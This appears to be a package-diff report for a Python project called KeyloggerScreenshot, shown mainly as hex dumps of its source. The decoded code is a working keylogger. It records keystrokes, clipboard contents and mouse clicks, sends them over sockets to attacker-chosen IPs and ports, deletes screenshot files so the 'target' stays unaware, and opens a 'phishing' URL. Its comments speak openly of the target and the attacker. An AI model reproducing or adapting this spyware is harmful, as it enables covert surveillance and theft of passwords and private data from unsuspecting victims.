++00001a50: 6767 6572 2c20 706f 7274 5f6b 6579 6c6f  gger, port_keylo
++00001a60: 6767 6572 2929 0d0a 2020 2020 2020 2020  gger))..        
++00001a70: 2020 2020 6b65 795f 6461 7461 2e73 656e      key_data.sen
++00001a80: 6428 6461 7461 2e65 6e63 6f64 6528 2929  d(data.encode())
++00001a90: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
++00001aa0: 795f 6461 7461 2e63 6c6f 7365 2829 0d0a  y_data.close()..
++00001ab0: 0d0a 2020 2020 2020 2020 2020 2020 6966  ..            if
++00001ac0: 206f 732e 7061 7468 2e65 7869 7374 7328   os.path.exists(
++00001ad0: 2249 6d61 6765 2e70 6e67 2229 3a0d 0a20  "Image.png"):.. 
++00001ae0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
++00001af0: 2049 7420 7769 6c6c 2064 6573 7472 6f79   It will destroy
++00001b00: 2074 6865 2069 6d61 6765 2073 6f20 7461   the image so ta
++00001b10: 7267 6574 2077 6f75 6e64 206b 6e6f 7720  rget wound know 
++00001b20: 616e 7974 6869 6e67 0d0a 2020 2020 2020  anything..      
++00001b30: 2020 2020 2020 2020 2020 6668 616e 646c            fhandl
++00001b40: 652e 636c 6f73 6528 290d 0a20 2020 2020  e.close()..     
++00001b50: 2020 2020 2020 2020 2020 206f 732e 7265             os.re
++00001b60: 6d6f 7665 2822 496d 6167 652e 706e 6722  move("Image.png"
++00001b70: 290d 0a20 2020 2020 2020 2020 2020 2023  )..            #
++00001b80: 2054 6869 7320 7265 6d6f 7665 7320 7468   This removes th
++00001b90: 6520 696d 6167 650d 0a0d 0a20 2020 2064  e image....    d
++00001ba0: 6566 206b 696c 6c5f 7377 6974 6368 2873  ef kill_switch(s
++00001bb0: 656c 6629 3a0d 0a20 2020 2020 2020 2023  elf):..        #
++00001bc0: 2054 6869 7320 6675 6e63 7469 6f6e 2064   This function d
++00001bd0: 6573 7472 6f79 7320 7468 6520 6d6f 7573  estroys the mous
++00001be0: 6520 696e 666f 0d0a 2020 2020 2020 2020  e info..        
++00001bf0: 6e65 775f 7365 636f 6e64 7320 3d20 7365  new_seconds = se
++00001c00: 6c66 2e64 7572 6174 696f 6e20 2b20 350d  lf.duration + 5.
++00001c10: 0a20 2020 2020 2020 2023 2032 3020 7365  .        # 20 se
++00001c20: 636f 6e64 7320 6172 6520 6265 696e 6720  conds are being 
++00001c30: 6164 6465 6420 6265 6361 7573 6520 7468  added because th
++00001c40: 6572 6520 6d69 6768 7420 6265 2061 2070  ere might be a p
++00001c50: 726f 626c 656d 0d0a 2020 2020 2020 2020  roblem..        
++00001c60: 666f 7220 7820 696e 2072 616e 6765 286e  for x in range(n
++00001c70: 6577 5f73 6563 6f6e 6473 293a 0d0a 2020  ew_seconds):..  
++00001c80: 2020 2020 2020 2020 2020 7469 6d65 2e73            time.s
++00001c90: 6c65 6570 2831 290d 0a20 2020 2020 2020  leep(1)..       
++00001ca0: 2023 2054 6869 7320 7374 6f70 6573 2074   # This stopes t
++00001cb0: 6865 0d0a 2020 2020 2020 2020 7379 732e  he..        sys.
++00001cc0: 6578 6974 2829 0d0a 0d0a 2020 2020 6465  exit()....    de
++00001cd0: 6620 6f6e 5f63 6c69 636b 2873 656c 662c  f on_click(self,
++00001ce0: 2078 2c20 792c 2062 7574 746f 6e2c 2070   x, y, button, p
++00001cf0: 7265 7373 6564 293a 0d0a 2020 2020 2020  ressed):..      
++00001d00: 2020 2320 5468 6973 2069 7320 7468 6520    # This is the 
++00001d10: 636c 6963 6b20 6675 6e63 7469 6f6e 0d0a  click function..
++00001d20: 2020 2020 2020 2020 7072 696e 7428 6622          print(f"
++00001d30: 5461 7267 6574 2068 6173 2070 7265 7373  Target has press
++00001d40: 6564 207b 787d 2061 6e64 207b 797d 2229  ed {x} and {y}")
++00001d50: 0d0a 2020 2020 2020 2020 2320 416c 6c20  ..        # All 
++00001d60: 7468 6520 636f 6f72 6469 6e61 7465 7320  the coordinates 
++00001d70: 7769 6c6c 2062 6520 7374 6f72 6564 2069  will be stored i
++00001d80: 6e20 2273 656c 662e 636f 6f72 6469 6e61  n "self.coordina
++00001d90: 7465 7322 0d0a 2020 2020 2020 2020 7365  tes"..        se
++00001da0: 6c66 2e63 6f6f 7264 696e 6174 6573 2e61  lf.coordinates.a
++00001db0: 7070 656e 6428 2878 2c20 7929 290d 0a0d  ppend((x, y))...
++00001dc0: 0a20 2020 2064 6566 2061 6c6c 5f63 6c69  .    def all_cli
++00001dd0: 636b 7328 7365 6c66 293a 0d0a 2020 2020  cks(self):..    
++00001de0: 2020 2020 2320 5468 6973 2069 7320 6a75      # This is ju
++00001df0: 7374 2061 2066 756e 6374 696f 6e20 736f  st a function so
++00001e00: 2069 7420 6361 6e20 6265 2072 616e 2077   it can be ran w
++00001e10: 6974 6820 7468 7265 6164 696e 670d 0a20  ith threading.. 
++00001e20: 2020 2020 2020 2077 6974 6820 4c69 7374         with List
++00001e30: 656e 6572 286f 6e5f 636c 6963 6b3d 7365  ener(on_click=se
++00001e40: 6c66 2e6f 6e5f 636c 6963 6b29 2061 7320  lf.on_click) as 
++00001e50: 6c69 7374 656e 696e 673a 0d0a 2020 2020  listening:..    
++00001e60: 2020 2020 2020 2020 7365 6c66 2e6b 696c          self.kil
++00001e70: 6c5f 7377 6974 6368 2829 0d0a 2020 2020  l_switch()..    
++00001e80: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
++00001e90: 672e 6a6f 696e 2829 0d0a 2020 2020 0d0a  g.join()..    ..
++00001ea0: 2020 2020 6465 6620 636f 7079 5f64 6174      def copy_dat
++00001eb0: 6128 7365 6c66 293a 0d0a 2020 2020 2020  a(self):..      
++00001ec0: 2020 7365 6c66 2e72 6963 6874 6967 655f    self.richtige_
++00001ed0: 6c69 7374 652e 6170 7065 6e64 2822 2028  liste.append(" (
++00001ee0: 434f 5059 2028 5374 7267 2b63 2929 2022  COPY (Strg+c)) "
++00001ef0: 290d 0a0d 0a20 2020 2064 6566 2061 7070  )....    def app
++00001f00: 656e 645f 7061 7374 6528 7365 6c66 293a  end_paste(self):
++00001f10: 0d0a 2020 2020 2020 2020 6461 7461 203d  ..        data =
++00001f20: 2066 2220 287b 7079 7065 7263 6c69 702e   f" ({pyperclip.
++00001f30: 7061 7374 6528 297d 207c 2050 4153 5445  paste()} | PASTE
++00001f40: 2028 5374 7267 2b76 2929 207c 2022 0d0a   (Strg+v)) | "..
++00001f50: 2020 2020 2020 2020 7365 6c66 2e72 6963          self.ric
++00001f60: 6874 6967 655f 6c69 7374 652e 6170 7065  htige_liste.appe
++00001f70: 6e64 2864 6174 6129 0d0a 0d0a 2020 2020  nd(data)....    
++00001f80: 6465 6620 7072 696e 745f 776f 726b 2873  def print_work(s
++00001f90: 656c 662c 2077 6f72 6429 3a0d 0a20 2020  elf, word):..   
++00001fa0: 2020 2020 2070 7269 6e74 2866 2741 6c70       print(f'Alp
++00001fb0: 6861 6265 7469 6320 6b65 7920 7761 7320  habetic key was 
++00001fc0: 7072 6573 7365 643a 207b 776f 7264 7d20  pressed: {word} 
++00001fd0: 2729 0d0a 2020 2020 2020 2020 7365 6c66  ')..        self
++00001fe0: 2e72 6963 6874 6967 655f 6c69 7374 6520  .richtige_liste 
++00001ff0: 2b3d 2077 6f72 640d 0a20 2020 2020 2020  += word..       
++00002000: 2023 2045 7665 7279 2070 7265 7373 6564   # Every pressed
++00002010: 206b 6579 2077 696c 6c20 6265 2073 6176   key will be sav
++00002020: 6564 2069 6e20 2272 6963 6874 6967 655f  ed in "richtige_
++00002030: 6c69 7374 6522 2074 6869 7320 6973 2061  liste" this is a
++00002040: 2067 6572 6d61 6e20 7365 6c66 2e77 6f72   german self.wor
++00002050: 6420 616e 6420 6d65 616e 7320 2272 6967  d and means "rig
++00002060: 6874 5f6c 6973 7422 0d0a 0d0a 2020 2020  ht_list"....    
++00002070: 6465 6620 6f6e 5f70 7265 7373 2873 656c  def on_press(sel
++00002080: 662c 206b 6579 293a 0d0a 2020 2020 2020  f, key):..      
++00002090: 2020 7472 793a 0d0a 2020 2020 2020 2020    try:..        
++000020a0: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
++000020b0: 2020 2020 2020 2020 2020 6f74 6865 725f            other_
++000020c0: 6368 6172 6563 7465 7273 203d 207b 2231  charecters = {"1
++000020d0: 223a 2022 2122 2c20 2232 223a 2027 2227  ": "!", "2": '"'
++000020e0: 2c20 2233 223a 2022 c2a7 222c 2022 3422  , "3": "..", "4"
++000020f0: 3a20 2224 222c 2022 3522 3a20 2225 222c  : "$", "5": "%",
++00002100: 2022 3622 3a20 2226 222c 2022 3722 3a20   "6": "&", "7": 
++00002110: 222f 222c 2022 3822 3a20 2228 222c 0d0a  "/", "8": "(",..
++00002120: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002130: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002140: 2020 2020 2239 223a 2022 2922 2c20 2230      "9": ")", "0
++00002150: 223a 2022 3d22 2c20 22c3 9f22 3a20 223f  ": "=", "..": "?
++00002160: 227d 0d0a 2020 2020 2020 2020 2020 2020  "}..            
++00002170: 2020 2020 6966 2073 656c 662e 6361 7073      if self.caps
++00002180: 2069 7320 5472 7565 3a0d 0a20 2020 2020   is True:..     
++00002190: 2020 2020 2020 2020 2020 2020 2020 2069                 i
++000021a0: 6620 6b65 792e 6368 6172 2069 6e20 6f74  f key.char in ot
++000021b0: 6865 725f 6368 6172 6563 7465 7273 3a0d  her_charecters:.
++000021c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++000021d0: 2020 2020 2020 2020 2073 656c 662e 776f           self.wo
++000021e0: 7264 203d 206f 7468 6572 5f63 6861 7265  rd = other_chare
++000021f0: 6374 6572 735b 6b65 792e 6368 6172 5d0d  cters[key.char].
++00002200: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++00002210: 2020 2020 2020 2020 2023 2055 7070 6572           # Upper
++00002220: 2043 6861 7261 6374 6572 7320 6672 6f6d   Characters from
++00002230: 2022 3122 2074 6f20 2230 2220 6265 6361   "1" to "0" beca
++00002240: 7573 6520 616c 6c20 7468 6973 206e 756d  use all this num
++00002250: 6265 7273 2061 7265 206e 6f74 2063 6861  bers are not cha
++00002260: 7265 6374 6572 7320 6172 6520 6e6f 7420  recters are not 
++00002270: 696e 2070 796e 7075 740d 0a20 2020 2020  in pynput..     
++00002280: 2020 2020 2020 2020 2020 2020 2020 2065                 e
++00002290: 6c73 653a 0d0a 2020 2020 2020 2020 2020  lse:..          
++000022a0: 2020 2020 2020 2020 2020 2020 2020 7365                se
++000022b0: 6c66 2e77 6f72 6420 3d20 6b65 792e 6368  lf.word = key.ch
++000022c0: 6172 2e75 7070 6572 2829 0d0a 2020 2020  ar.upper()..    
++000022d0: 2020 2020 2020 2020 2020 2020 656c 7365              else
++000022e0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
++000022f0: 2020 2020 2020 2073 656c 662e 776f 7264         self.word
++00002300: 203d 206b 6579 2e63 6861 720d 0a0d 0a20   = key.char.... 
++00002310: 2020 2020 2020 2020 2020 2020 2020 2061                 a
++00002320: 6c6c 5f72 6571 5f6b 6579 7320 3d20 7b22  ll_req_keys = {"
++00002330: 0322 3a20 7365 6c66 2e63 6f70 795f 6461  .": self.copy_da
++00002340: 7461 2c20 2216 223a 2073 656c 662e 6170  ta, ".": self.ap
++00002350: 7065 6e64 5f70 6173 7465 7d0d 0a20 2020  pend_paste}..   
++00002360: 2020 2020 2020 2020 2020 2020 2023 2022               # "
++00002370: 4554 5822 2073 7461 6e64 7320 666f 7220  ETX" stands for 
++00002380: 2245 6e64 2d54 6578 742d 6368 6172 6163  "End-Text-charac
++00002390: 7465 7222 2061 6e64 2069 7320 6120 636f  ter" and is a co
++000023a0: 6e74 726f 6c20 6368 6172 6163 7465 7220  ntrol character 
++000023b0: 7768 6963 6820 6b6e 6f77 7320 7468 6520  which knows the 
++000023c0: 6368 6172 6163 7465 7220 6f66 2063 6f70  character of cop
++000023d0: 7969 6e67 2073 6f6d 6574 6869 6e67 206f  ying something o
++000023e0: 6e20 7468 6520 6b65 7962 6f61 7264 0d0a  n the keyboard..
++000023f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002400: 2320 2253 594e 2220 7374 616e 6473 2066  # "SYN" stands f
++00002410: 6f72 2022 5379 6e63 6872 6f6e 6f75 7320  or "Synchronous 
++00002420: 4964 6c65 2220 616e 6420 6973 2061 2063  Idle" and is a c
++00002430: 6f6e 7472 6f6c 2063 6861 7261 6374 6572  ontrol character
++00002440: 2077 6869 6368 206b 6e6f 7773 2074 6865   which knows the
++00002450: 2063 6861 7261 6374 6572 206f 6620 7061   character of pa
++00002460: 7374 696e 6720 736f 6d65 7468 696e 6720  sting something 
++00002470: 6f6e 2074 6865 206b 6579 626f 6172 640d  on the keyboard.
++00002480: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++00002490: 2066 6f72 2065 6163 685f 6b65 7920 696e   for each_key in
++000024a0: 2061 6c6c 5f72 6571 5f6b 6579 733a 0d0a   all_req_keys:..
++000024b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
++000024c0: 2020 2020 6966 2065 6163 685f 6b65 7920      if each_key 
++000024d0: 3d3d 206b 6579 2e63 6861 723a 0d0a 2020  == key.char:..  
++000024e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
++000024f0: 2020 2020 2020 2320 4966 2074 6865 2063        # If the c
++00002500: 6f70 7920 6368 6172 6163 7465 7220 6973  opy character is
++00002510: 2070 7265 7373 6564 2c20 6561 6368 2066   pressed, each f
++00002520: 756e 6374 696f 6e20 6f66 2065 6163 6820  unction of each 
++00002530: 6368 6172 6163 7465 7220 7769 6c6c 2062  character will b
++00002540: 6520 776f 726b 696e 670d 0a20 2020 2020  e working..     
++00002550: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002560: 2020 2061 6c6c 5f72 6571 5f6b 6579 735b     all_req_keys[
++00002570: 6561 6368 5f6b 6579 5d28 290d 0a20 2020  each_key]()..   
++00002580: 2020 2020 2020 2020 2020 2020 2074 7279               try
++00002590: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
++000025a0: 2020 2020 2020 2061 7363 695f 6e75 6d62         asci_numb
++000025b0: 6572 203d 206f 7264 2873 656c 662e 776f  er = ord(self.wo
++000025c0: 7264 290d 0a20 2020 2020 2020 2020 2020  rd)..           
++000025d0: 2020 2020 2020 2020 2023 204f 7264 696e           # Ordin
++000025e0: 616c 206e 756d 6265 7220 696e 2074 6865  al number in the
++000025f0: 2072 616e 6765 206f 6620 3020 746f 2033   range of 0 to 3
++00002600: 3120 636f 6d70 6c65 7465 7320 616c 6c20  1 completes all 
++00002610: 7370 6563 6961 6c20 6368 6172 6163 7465  special characte
++00002620: 7273 2077 6974 6820 7468 6520 6b65 7920  rs with the key 
++00002630: 2273 7472 6720 2b20 6c65 7474 6572 220d  "strg + letter".
++00002640: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++00002650: 2020 2020 2069 6620 6173 6369 5f6e 756d       if asci_num
++00002660: 6265 7220 6e6f 7420 696e 2072 616e 6765  ber not in range
++00002670: 2830 2c20 3332 293a 0d0a 2020 2020 2020  (0, 32):..      
++00002680: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002690: 2020 2320 6966 2074 6865 7265 2069 7320    # if there is 
++000026a0: 6e6f 2073 7065 6369 616c 2063 6861 7261  no special chara
++000026b0: 6374 6572 2069 7420 6a75 7374 2070 7269  cter it just pri
++000026c0: 6e74 7320 7468 6520 616c 7068 6162 6574  nts the alphabet
++000026d0: 6963 206e 756d 6265 720d 0a20 2020 2020  ic number..     
++000026e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
++000026f0: 2020 2073 656c 662e 7072 696e 745f 776f     self.print_wo
++00002700: 726b 2873 656c 662e 776f 7264 290d 0a0d  rk(self.word)...
++00002710: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++00002720: 2065 7863 6570 7420 5479 7065 4572 726f   except TypeErro
++00002730: 723a 0d0a 2020 2020 2020 2020 2020 2020  r:..            
++00002740: 2020 2020 2020 2020 2320 7072 696e 7473          # prints
++00002750: 2074 6865 2061 6c70 6861 6265 7463 206e   the alphabetc n
++00002760: 756d 6265 720d 0a20 2020 2020 2020 2020  umber..         
++00002770: 2020 2020 2020 2020 2020 2073 656c 662e             self.
++00002780: 7072 696e 745f 776f 726b 2873 656c 662e  print_work(self.
++00002790: 776f 7264 290d 0a0d 0a20 2020 2020 2020  word)....       
++000027a0: 2020 2020 2020 2020 2070 7269 6e74 2873           print(s
++000027b0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
++000027c0: 7465 290d 0a20 2020 2020 2020 2020 2020  te)..           
++000027d0: 2065 7863 6570 7420 5479 7065 4572 726f   except TypeErro
++000027e0: 723a 0d0a 2020 2020 2020 2020 2020 2020  r:..            
++000027f0: 2020 2020 7061 7373 0d0a 0d0a 2020 2020      pass....    
++00002800: 2020 2020 6578 6365 7074 2041 7474 7269      except Attri
++00002810: 6275 7465 4572 726f 723a 0d0a 2020 2020  buteError:..    
++00002820: 2020 2020 2020 2020 7072 696e 7428 6627          print(f'
++00002830: 416e 206f 7468 6572 206b 6579 2077 6173  An other key was
++00002840: 2070 7265 7373 6564 3a20 7b6b 6579 7d27   pressed: {key}'
++00002850: 290d 0a20 2020 2020 2020 2020 2020 2069  )..            i
++00002860: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
++00002870: 642e 4b65 792e 7370 6163 6520 6f72 206b  d.Key.space or k
++00002880: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
++00002890: 6579 2e74 6162 3a0d 0a20 2020 2020 2020  ey.tab:..       
++000028a0: 2020 2020 2020 2020 2073 656c 662e 7269           self.ri
++000028b0: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
++000028c0: 227b 220d 0a20 2020 2020 2020 2020 2020  "{"..           
++000028d0: 2020 2020 2023 2049 6620 7468 6520 7461       # If the ta
++000028e0: 7267 6574 2070 7265 7373 6573 2074 6162  rget presses tab
++000028f0: 206f 7220 7370 6163 6520 6120 227b 2220   or space a "{" 
++00002900: 7769 6c6c 2062 6520 6170 7065 6e64 6564  will be appended
++00002910: 2074 6f20 7468 6520 6c69 7374 2073 6f20   to the list so 
++00002920: 7468 6520 6174 7461 636b 6572 206b 6e6f  the attacker kno
++00002930: 7773 2077 6865 6e20 616e 640d 0a20 2020  ws when and..   
++00002940: 2020 2020 2020 2020 2020 2020 2023 2073               # s
++00002950: 7061 6365 206f 7220 6120 7461 6220 6b65  pace or a tab ke
++00002960: 7920 6861 7320 6265 656e 2070 7265 7373  y has been press
++00002970: 6564 0d0a 2020 2020 2020 2020 2020 2020  ed..            
++00002980: 656c 6966 206b 6579 203d 3d20 6b65 7962  elif key == keyb
++00002990: 6f61 7264 2e4b 6579 2e63 6170 735f 6c6f  oard.Key.caps_lo
++000029a0: 636b 3a0d 0a20 2020 2020 2020 2020 2020  ck:..           
++000029b0: 2020 2020 2073 656c 662e 6361 7073 203d       self.caps =
++000029c0: 2054 7275 650d 0a20 2020 2020 2020 2020   True..         
++000029d0: 2020 2020 2020 2073 656c 662e 6368 6563         self.chec
++000029e0: 6b2e 6170 7065 6e64 2831 290d 0a20 2020  k.append(1)..   
++000029f0: 2020 2020 2020 2020 2063 6865 636b 5f63           check_c
++00002a00: 6170 7320 3d20 7375 6d28 7365 6c66 2e63  aps = sum(self.c
++00002a10: 6865 636b 2920 2f20 320d 0a20 2020 2020  heck) / 2..     
++00002a20: 2020 2020 2020 2023 2049 6620 6368 6563         # If chec
++00002a30: 6b5f 6361 7073 2069 7320 6e6f 7420 7072  k_caps is not pr
++00002a40: 696d 6172 7920 6974 2077 696c 6c20 7365  imary it will se
++00002a50: 7420 7365 6c66 2e63 6170 7320 746f 2046  t self.caps to F
++00002a60: 616c 7365 0d0a 0d0a 2020 2020 2020 2020  alse....        
++00002a70: 2020 2020 6966 2073 7472 2863 6865 636b      if str(check
++00002a80: 5f63 6170 7329 5b2d 315d 2021 3d20 2730  _caps)[-1] != '0
++00002a90: 273a 0d0a 2020 2020 2020 2020 2020 2020  ':..            
++00002aa0: 2020 2020 7061 7373 0d0a 2020 2020 2020      pass..      
++00002ab0: 2020 2020 2020 656c 7365 3a0d 0a20 2020        else:..   
++00002ac0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
++00002ad0: 662e 6361 7073 203d 2046 616c 7365 0d0a  f.caps = False..
++00002ae0: 0d0a 2020 2020 6465 6620 6f6e 5f72 656c  ..    def on_rel
++00002af0: 6561 7365 2873 656c 662c 206b 6579 293a  ease(self, key):
++00002b00: 0d0a 2020 2020 2020 2020 7072 696e 7428  ..        print(
++00002b10: 6627 4b65 7920 7265 6c65 6173 6564 3a20  f'Key released: 
++00002b20: 7b6b 6579 7d27 290d 0a0d 0a20 2020 2064  {key}')....    d
++00002b30: 6566 2073 7461 7274 2873 656c 6629 3a0d  ef start(self):.
++00002b40: 0a20 2020 2020 2020 2069 6620 7365 6c66  .        if self
++00002b50: 2e70 6869 7368 696e 6720 6973 206e 6f74  .phishing is not
++00002b60: 204e 6f6e 653a 0d0a 2020 2020 2020 2020   None:..        
++00002b70: 2020 2020 7768 696c 6520 5472 7565 3a0d      while True:.
++00002b80: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++00002b90: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
++00002ba0: 2020 2020 2020 2020 2020 2072 6573 706f             respo
++00002bb0: 6e73 6520 3d20 7265 7175 6573 7473 2e67  nse = requests.g
++00002bc0: 6574 2873 656c 662e 7068 6973 6869 6e67  et(self.phishing
++00002bd0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
++00002be0: 2020 2020 2020 2023 5265 7370 6f6e 6520         #Respone 
++00002bf0: 6973 2068 6572 6520 746f 2073 6565 2069  is here to see i
++00002c00: 6620 7468 6520 7765 6273 6974 6520 6973  f the website is
++00002c10: 206f 6e6c 696e 6520 6f72 206e 6f74 0d0a   online or not..
++00002c20: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002c30: 2020 2020 7765 6262 726f 7773 6572 2e6f      webbrowser.o
++00002c40: 7065 6e28 7365 6c66 2e70 6869 7368 696e  pen(self.phishin
++00002c50: 6729 0d0a 2020 2020 2020 2020 2020 2020  g)..            
++00002c60: 2020 2020 2020 2020 6272 6561 6b0d 0a0d          break...
++00002c70: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
++00002c80: 2065 7863 6570 7420 7265 7175 6573 7473   except requests
++00002c90: 2e65 7863 6570 7469 6f6e 732e 436f 6e6e  .exceptions.Conn
++00002ca0: 6563 7469 6f6e 4572 726f 723a 0d0a 2020  ectionError:..  
++00002cb0: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00002cc0: 2020 7072 696e 7428 224e 6f20 636f 6e6e    print("No conn
++00002cd0: 6563 7469 6f6e 2229 0d0a 2020 2020 2020  ection")..      
++00002ce0: 2020 2020 2020 2020 2020 2020 2020 7379                sy
++00002cf0: 732e 6578 6974 2829 0d0a 0d0a 2020 2020  s.exit()....    
++00002d00: 2020 2020 6c69 7374 656e 696e 675f 7468      listening_th
++00002d10: 7265 6164 203d 2074 6872 6561 6469 6e67  read = threading
++00002d20: 2e54 6872 6561 6428 7461 7267 6574 3d73  .Thread(target=s
++00002d30: 656c 662e 6461 7465 6e5f 6175 666e 6568  elf.daten_aufneh
++00002d40: 656d 656e 290d 0a20 2020 2020 2020 2023  emen)..        #
++00002d50: 2054 6869 7320 7275 6e73 2074 6865 2070   This runs the p
++00002d60: 726f 6772 616d 6d20 6265 6869 6e64 2074  rogramm behind t
++00002d70: 6865 2061 6374 7561 6c20 7072 6f67 7261  he actual progra
++00002d80: 6d6d 696e 670d 0a20 2020 2020 2020 206c  mming..        l
++00002d90: 6973 7465 6e69 6e67 5f74 6872 6561 642e  istening_thread.
++00002da0: 7374 6172 7428 290d 0a0d 0a20 2020 2020  start()....     
++00002db0: 2020 2074 6872 6561 6469 6e67 5f6d 6f75     threading_mou
++00002dc0: 7365 203d 2074 6872 6561 6469 6e67 2e54  se = threading.T
++00002dd0: 6872 6561 6428 7461 7267 6574 3d73 656c  hread(target=sel
++00002de0: 662e 616c 6c5f 636c 6963 6b73 290d 0a20  f.all_clicks).. 
++00002df0: 2020 2020 2020 2023 2054 6869 7320 7275         # This ru
++00002e00: 6e73 2074 6865 2070 726f 6772 616d 6d20  ns the programm 
++00002e10: 6265 6869 6e64 2074 6865 2061 6374 7561  behind the actua
++00002e20: 6c20 7072 6f67 7261 6d6d 696e 670d 0a20  l programming.. 
++00002e30: 2020 2020 2020 2074 6872 6561 6469 6e67         threading
++00002e40: 5f6d 6f75 7365 2e73 7461 7274 2829 0d0a  _mouse.start()..
++00002e50: 0d0a 2020 2020 2020 2020 7365 6e64 5f74  ..        send_t
++00002e60: 696d 6572 203d 2073 6f63 6b65 742e 736f  imer = socket.so
++00002e70: 636b 6574 2873 6f63 6b65 742e 4146 5f49  cket(socket.AF_I
++00002e80: 4e45 542c 2073 6f63 6b65 742e 534f 434b  NET, socket.SOCK
++00002e90: 5f53 5452 4541 4d29 0d0a 2020 2020 2020  _STREAM)..      
++00002ea0: 2020 7365 6e64 5f74 696d 6572 2e63 6f6e    send_timer.con
++00002eb0: 6e65 6374 2828 7365 6c66 2e69 705f 7469  nect((self.ip_ti
++00002ec0: 6d65 722c 2073 656c 662e 706f 7274 5f74  mer, self.port_t
++00002ed0: 696d 6572 2929 0d0a 0d0a 2020 2020 2020  imer))....      
++00002ee0: 2020 7365 6e64 5f74 696d 6572 2e73 656e    send_timer.sen
++00002ef0: 6428 7374 7228 7365 6c66 2e64 7572 6174  d(str(self.durat
++00002f00: 696f 6e29 2e65 6e63 6f64 6528 2929 0d0a  ion).encode())..
++00002f10: 2020 2020 2020 2020 2320 5468 6973 2073          # This s
++00002f20: 656e 6473 2074 6865 2073 6563 6f6e 6473  ends the seconds
++00002f30: 2074 6f20 7468 6520 7365 7276 6572 0d0a   to the server..
++00002f40: 2020 2020 2020 2020 7365 6e64 5f74 696d          send_tim
++00002f50: 6572 2e63 6c6f 7365 2829 0d0a 0d0a 2020  er.close()....  
++00002f60: 2020 2020 2020 7769 7468 206b 6579 626f        with keybo
++00002f70: 6172 642e 4c69 7374 656e 6572 286f 6e5f  ard.Listener(on_
++00002f80: 7072 6573 733d 7365 6c66 2e6f 6e5f 7072  press=self.on_pr
++00002f90: 6573 732c 206f 6e5f 7265 6c65 6173 653d  ess, on_release=
++00002fa0: 7365 6c66 2e6f 6e5f 7265 6c65 6173 6529  self.on_release)
++00002fb0: 2061 7320 6c69 7374 656e 6572 3a0d 0a20   as listener:.. 
++00002fc0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
++00002fd0: 636f 756e 7464 6f77 6e5f 7365 6e64 2873  countdown_send(s
++00002fe0: 656c 662e 6475 7261 7469 6f6e 2c20 7365  elf.duration, se
++00002ff0: 6c66 2e69 705f 7068 6f74 6f73 2c20 7365  lf.ip_photos, se
++00003000: 6c66 2e70 6f72 745f 7068 6f74 6f73 2c20  lf.port_photos, 
++00003010: 7365 6c66 2e69 705f 6b65 796c 6f67 6765  self.ip_keylogge
++00003020: 722c 0d0a 2020 2020 2020 2020 2020 2020  r,..            
++00003030: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00003040: 2020 2020 7365 6c66 2e70 6f72 745f 6b65      self.port_ke
++00003050: 796c 6f67 6765 7229 0d0a 2020 2020 2020  ylogger)..      
++00003060: 2020 2020 2020 6c69 7374 656e 6572 2e6a        listener.j
++00003070: 6f69 6e28 290d 0a20 2020 2020 2020 2020  oin()..         
++00003080: 2020 2023 2054 6869 7320 6c69 7374 656e     # This listen
++00003090: 7320 746f 2074 6865 206b 6579 7320 7468  s to the keys th
++000030a0: 6174 2077 6865 7265 2074 7970 6564 0d0a  at where typed..
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Port_data.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_keylogger.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_listener.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_photos.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_timer.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Simulation_code.py`
+
+ * *Files 10% similar despite different names*
+
+```diff
+@@ -56,18 +56,15 @@
+     def changecol():  # This function is here to if the simulation has ended
+         startbutton.configure(bg="red")
+         # This is the button
+         startbutton["text"] = "Stop simulation"
+         data = subprocess.check_output("tasklist")
+         str_data = str(data).split()
